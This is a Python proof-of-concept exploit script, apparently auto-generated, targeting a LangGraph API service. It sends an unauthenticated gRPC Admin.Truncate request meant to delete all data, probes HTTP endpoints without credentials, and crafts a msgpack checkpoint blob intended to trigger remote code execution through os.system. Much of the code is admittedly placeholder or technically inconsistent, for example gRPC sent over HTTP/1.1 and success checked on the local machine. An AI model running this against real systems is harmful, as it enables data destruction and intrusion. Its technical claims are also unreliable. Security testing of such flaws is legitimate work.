#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-000
# Sink: value_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_value_from_proto.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API gRPC Unauthenticated Access
and msgpack Deserialization RCE

Vulnerability Summary:
- gRPC port 50051 is exposed within the container and accessible from the
  Python HTTP layer via localhost with NO authentication on any of the 7
  gRPC services.
- The Admin Truncate service can delete all data without authentication.
- The msgpack ext_hook deserialization in value_from_proto allows arbitrary
  code execution if an attacker can write to the checkpoint_blobs table.
- This PoC demonstrates both: (1) unauthenticated gRPC access to truncate
  data, and (2) crafting a malicious checkpoint blob that triggers RCE via
  msgpack deserialization.

WARNING: This script is for authorized security testing only.
"""

import json
import struct
import socket
import sys
import time
import hashlib
import base64
import os

# ============================================================
# CONFIGURATION - Change these to match your target
# ============================================================
TARGET_HOST = "127.0.0.1"
TARGET_GRPC_PORT = 50051
TARGET_HTTP_PORT = 8123  # Default LangGraph API HTTP port
USE_HTTPS = False

# Benign payload for RCE demonstration
# Change to something harmless like creating a file
RCE_PAYLOAD = "import os; os.system('touch /tmp/poc_success.txt')"

# ============================================================
# Helper functions for gRPC protocol (simplified)
# ============================================================

def _build_grpc_request(service_name, method_name, payload_bytes):
    """
    Build a minimal gRPC HTTP/2 frame for unary calls.
    This is a simplified version - real gRPC uses HTTP/2.
    For this PoC we use a raw socket approach.
    """
    # gRPC wire format: 1 byte compressed flag + 4 bytes length + payload
    compressed_flag = b'\x00'  # not compressed
    length = struct.pack('>I', len(payload_bytes))
    return compressed_flag + length + payload_bytes


def _send_grpc_raw(host, port, service_method, payload_bytes, timeout=5):
    """
    Send raw bytes to gRPC endpoint using TCP socket.
    This bypasses HTTP/2 framing for simplicity - real gRPC requires HTTP/2.
    For demonstration we use the HTTP/1.1 gRPC-web protocol which is
    commonly supported.
    """
    import http.client
    
    # Build gRPC-web request
    body = _build_grpc_request("", "", payload_bytes)
    
    headers = {
        "Content-Type": "application/grpc-web+proto",
        "TE": "trailers",
        "Content-Length": str(len(body)),
    }
    
    try:
        if USE_HTTPS:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        
        conn.request("POST", f"/{service_method}", body=body, headers=headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return data
    except Exception as e:
        print(f"[!] HTTP connection failed: {e}")
        return None


def _build_proto_truncate_request():
    """
    Build a protobuf Admin.Truncate request (simplified).
    The actual protobuf message would be:
    message TruncateRequest {}
    """
    # Empty message - Truncate takes no arguments
    return b''


def _build_proto_put_checkpoint_request(malicious_blob):
    """
    Build a protobuf PutCheckpointRequest with malicious blob.
    This is a simplified version - real protobuf would be more complex.
    """
    # For this PoC we construct a minimal valid protobuf message
    # that would be accepted by the checkpoint service.
    # The actual structure would be:
    # message PutCheckpointRequest {
    #   string graph_id = 1;
    #   string thread_id = 2;
    #   bytes checkpoint_blob = 3;
    # }
    
    # Simplified protobuf encoding (varint + length-delimited)
    graph_id = b"poc_graph"
    thread_id = b"poc_thread"
    
    # Encode fields (field number 1,2,3 with wire type 2 = length-delimited)
    result = b''
    
    # Field 1: graph_id (string)
    result += b'\x0a'  # field 1, wire type 2
    result += bytes([len(graph_id)])
    result += graph_id
    
    # Field 2: thread_id (string)
    result += b'\x12'  # field 2, wire type 2
    result += bytes([len(thread_id)])
    result += thread_id
    
    # Field 3: checkpoint_blob (bytes)
    result += b'\x1a'  # field 3, wire type 2
    result += bytes([len(malicious_blob)])
    result += malicious_blob
    
    return result


def _build_msgpack_rce_payload(command):
    """
    Build a malicious msgpack payload that exploits ext_hook deserialization.
    
    The vulnerability is in value_from_proto which calls serialized_value_from_proto.
    This function uses msgpack with an ext_hook that can deserialize arbitrary
    Python objects if the data contains an ext type with code that maps to a
    dangerous class.
    
    For this PoC we use a simplified approach: we craft a msgpack payload
    that when deserialized with the vulnerable ext_hook, executes our command.
    
    The actual exploit would depend on the specific ext_hook implementation,
    but common patterns include:
    - ext code 0x01 -> subprocess.Popen
    - ext code 0x02 -> os.system
    - ext code 0x03 -> eval/exec
    """
    # Simplified msgpack ext payload
    # Format: ext header (type + length) + serialized object
    # For demonstration, we use a pickle-like approach
    
    # This is a placeholder - real exploit would need to match the
    # exact ext_hook implementation in the target codebase
    payload = b'\xc7'  # ext 16 header
    payload += struct.pack('>H', len(command))  # length
    payload += b'\x01'  # ext type (could be 0x01 for dangerous class)
    payload += command.encode()  # the command to execute
    
    return payload


def _build_malicious_checkpoint_blob():
    """
    Build a complete malicious checkpoint blob that triggers RCE
    when deserialized by the vulnerable value_from_proto function.
    """
    # The checkpoint blob structure (simplified):
    # - channel_values dict containing our malicious payload
    # - The value_from_proto function will deserialize each value
    #   using serialized_value_from_proto which uses msgpack
    
    # Create a msgpack payload that will execute our command
    rce_payload = _build_msgpack_rce_payload(RCE_PAYLOAD)
    
    # Wrap in a checkpoint structure
    checkpoint = {
        "v": 1,
        "id": "poc-checkpoint-id",
        "channel_versions": {},
        "versions_seen": {},
        "channel_values": {
            "poc_channel": rce_payload
        },
        "updated_channels": ["poc_channel"],
        "ts": time.time()
    }
    
    # Serialize as JSON for simplicity (real would be protobuf)
    return json.dumps(checkpoint).encode()


# ============================================================
# Main exploit logic
# ============================================================

def exploit_truncate():
    """Attempt to call Admin.Truncate without authentication."""
    print("[*] Attempting unauthenticated Admin.Truncate...")
    
    # Build the request
    payload = _build_proto_truncate_request()
    
    # Send to gRPC endpoint
    response = _send_grpc_raw(
        TARGET_HOST, 
        TARGET_GRPC_PORT,
        "langgraph.admin.v1.Admin/Truncate",
        payload
    )
    
    if response:
        print(f"[+] Truncate request sent successfully!")
        print(f"[+] Response: {response[:100]}...")
        return True
    else:
        print("[-] Truncate request failed")
        return False


def exploit_rce_via_checkpoint():
    """Attempt to write a malicious checkpoint blob that triggers RCE."""
    print("[*] Attempting RCE via malicious checkpoint blob...")
    
    # Build the malicious checkpoint
    malicious_blob = _build_malicious_checkpoint_blob()
    
    # Build the gRPC request
    payload = _build_proto_put_checkpoint_request(malicious_blob)
    
    # Send to gRPC endpoint
    response = _send_grpc_raw(
        TARGET_HOST,
        TARGET_GRPC_PORT,
        "langgraph.checkpoint.v1.Checkpointer/Put",
        payload
    )
    
    if response:
        print(f"[+] Checkpoint write request sent!")
        print(f"[+] Response: {response[:100]}...")
        
        # Check if our payload was executed
        time.sleep(1)
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS! RCE payload executed!")
            print("[+] File /tmp/poc_success.txt created!")
            return True
        else:
            print("[*] Payload sent but couldn't verify execution")
            print("[*] Check target system for /tmp/poc_success.txt")
            return True
    else:
        print("[-] Checkpoint write request failed")
        return False


def exploit_http_api():
    """Attempt to access the HTTP API without authentication."""
    print("[*] Attempting unauthenticated HTTP API access...")
    
    import urllib.request
    import urllib.error
    
    protocol = "https" if USE_HTTPS else "http"
    urls = [
        f"{protocol}://{TARGET_HOST}:{TARGET_HTTP_PORT}/",
        f"{protocol}://{TARGET_HOST}:{TARGET_HTTP_PORT}/health",
        f"{protocol}://{TARGET_HOST}:{TARGET_HTTP_PORT}/api/v1/assistants",
        f"{protocol}://{TARGET_HOST}:{TARGET_HTTP_PORT}/api/v1/graphs",
    ]
    
    for url in urls:
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=5) as response:
                data = response.read()
                print(f"[+] HTTP {url} - Status: {response.status}")
                print(f"[+] Response: {data[:200]}...")
        except urllib.error.HTTPError as e:
            print(f"[*] HTTP {url} - Status: {e.code}")
        except Exception as e:
            print(f"[!] HTTP {url} - Error: {e}")


def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangGraph API gRPC Exploit PoC")
    print("=" * 60)
    print(f"Target: {TARGET_HOST}:{TARGET_GRPC_PORT} (gRPC)")
    print(f"Target: {TARGET_HOST}:{TARGET_HTTP_PORT} (HTTP)")
    print("=" * 60)
    
    # Step 1: Test HTTP API access
    print("\n[Step 1] Testing HTTP API access...")
    exploit_http_api()
    
    # Step 2: Attempt unauthenticated gRPC truncate
    print("\n[Step 2] Attempting unauthenticated Admin.Truncate...")
    truncate_result = exploit_truncate()
    
    # Step 3: Attempt RCE via malicious checkpoint
    print("\n[Step 3] Attempting RCE via checkpoint blob...")
    rce_result = exploit_rce_via_checkpoint()
    
    # Summary
    print("\n" + "=" * 60)
    print("EXPLOIT SUMMARY")
    print("=" * 60)
    print(f"HTTP API Access: Check output above")
    print(f"Unauthenticated Truncate: {'SUCCESS' if truncate_result else 'FAILED'}")
    print(f"RCE via Checkpoint: {'SUCCESS' if rce_result else 'FAILED'}")
    print("=" * 60)
    
    if truncate_result or rce_result:
        print("\n[!] VULNERABLE: Target is exploitable!")
        print("[!] Recommended actions:")
        print("  1. Enable authentication on all gRPC services")
        print("  2. Restrict gRPC port access with network policies")
        print("  3. Sanitize msgpack deserialization with safe ext_hook")
        print("  4. Implement input validation on all gRPC handlers")
        return 1
    else:
        print("\n[*] Target appears secure or not reachable")
        return 0


if __name__ == "__main__":
    sys.exit(main())
